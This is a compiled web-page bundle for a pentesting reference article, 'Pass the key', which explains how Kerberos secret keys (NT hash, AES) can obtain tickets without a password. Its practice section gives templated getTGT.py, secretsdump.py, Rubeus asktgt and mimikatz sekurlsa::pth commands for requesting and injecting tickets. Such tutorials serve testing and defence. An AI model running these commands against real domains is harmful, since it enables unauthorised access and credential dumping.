import{_ as r,c as p,a5 as l,G as t,w as a,B as k,o,j as s,a as i}from"./chunks/framework.B5CpDqM0.js";const F=JSON.parse('{"title":"Pass the key","description":"","frontmatter":{"authors":"ShutdownRepo, mauricelambert, sckdev"},"headers":[],"relativePath":"ad/movement/kerberos/ptk.md","filePath":"ad/movement/kerberos/ptk.md","lastUpdated":1724982529000}'),d={name:"ad/movement/kerberos/ptk.md"};function E(c,e,g,y,u,b){const h=k("PluginTabsTab"),n=k("PluginTabs");return o(),p("div",null,[e[2]||(e[2]=l('<h1 id="pass-the-key" tabindex="-1">Pass the key <a class="header-anchor" href="#pass-the-key" aria-label="Permalink to &quot;Pass the key&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The Kerberos authentication protocol works with tickets in order to grant access. A Service Ticket (ST) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can be obtained by validating a first step named &quot;pre-authentication&quot; (except if that requirement is explicitly removed for some accounts, making them vulnerable to <a href="./asreproast">ASREProast</a>).</p><p>The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from the user password. An attacker knowing that secret key doesn&#39;t need knowledge of the actual password to obtain tickets. This is called pass-the-key.</p><p>Kerberos offers 4 different key types: DES, RC4, AES-128 and AES-256.</p><ul><li>When the RC4 etype is enabled, the RC4 key can be used. The problem is that the RC4 key is in fact the user&#39;s NT hash. Using a an NT hash to obtain Kerberos tickets is called <a href="./opth">overpass the hash</a>.</li><li>When RC4 is disabled, other Kerberos keys (DES, AES-128, AES-256) can be passed as well. This technique is called pass the key. In fact, only the name and key used differ between overpass the hash and pass the key, the technique is the same.</li></ul><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2>',7)),t(n,null,{default:a(()=>[t(h,{label:"UNIX-like"},{default:a(()=>e[0]||(e[0]=[s("p",null,[i("The "),s("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),i(" script "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py",target:"_blank",rel:"noreferrer"},"getTGT"),i(" (Python) can request a TGT (Ticket Granting Ticket) given a password, hash ("),s("code",null,"LMhash"),i(" can be empty), or aesKey. The TGT will be saved as a "),s("code",null,".ccache"),i(" file that can then be used by other Impacket scripts.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an NT hash (overpass-the-hash)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getTGT.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES (128 or 256 bits) key (pass-the-key)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getTGT.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -aesKey"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'KerberosKey'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET")])])])],-1),s("p",null,[i("Once a TGT is obtained, the tester can use it with the environment variable "),s("code",null,"KRB5CCNAME"),i(" with tools implementing "),s("a",{href:"./ptt"},"pass-the-ticket"),i(".")],-1),s("p",null,[i("An alternative to requesting the TGT and then passing the ticket is using the "),s("code",null,"-k"),i(" option in Impacket scripts. Using that option allows for passing either TGTs or STs. Example below with secretsdump.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET")])])])],-1)])),_:1}),t(h,{label:"Windows"},{default:a(()=>e[1]||(e[1]=[s("p",null,[i("On Windows, requesting a TGT can be achieved with "),s("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),i(" (C#). The ticket will be injected in the session and Windows will natively be able to use these tickets to access given services.")],-1),s("div",{class:"language-powershell vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"powershell"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an NT hash")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgt "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:$DOMAIN "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:$USER "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"rc4:$NThash "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES 128 key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgt "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:$DOMAIN "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:$USER "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"aes128:$aes128_key "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES 256 key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgt "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:$DOMAIN "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:$USER "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"aes256:$aes256_key "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt")])])])],-1),s("p",null,[i("An alternative to Rubeus is "),s("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"mimikatz"),i(" with "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth",target:"_blank",rel:"noreferrer"},[s("code",null,"sekurlsa::pth")]),i(".")],-1),s("div",{class:"language-powershell vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"powershell"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an NT hash")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sekurlsa::pth "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:$USER "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:$DOMAIN "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"rc4:$NThash "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES 128 key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sekurlsa::pth "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:$USER "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:$DOMAIN "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"aes128:$aes128_key "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES 256 key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sekurlsa::pth "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:$USER "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:$DOMAIN "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"aes256:$aes256_key "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt")])])])],-1),s("p",null,[i("For both mimikatz and Rubeus, the "),s("code",null,"/ptt"),i(" flag is used to automatically "),s("a",{href:"./ptt#injecting-the-ticket"},"inject the ticket"),i(".")],-1)])),_:1})]),_:1}),e[3]||(e[3]=l('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://blog.notso.pro/2020-05-09-offops-in-ad-1/" target="_blank" rel="noreferrer">https://blog.notso.pro/2020-05-09-offops-in-ad-1/</a></p><p><a href="http://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash" target="_blank" rel="noreferrer">http://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash</a></p><p><a href="https://blog.stealthbits.com/how-to-detect-overpass-the-hash-attacks/" target="_blank" rel="noreferrer">https://blog.stealthbits.com/how-to-detect-overpass-the-hash-attacks/</a></p>',4))])}const A=r(d,[["render",E]]);export{F as __pageData,A as default};
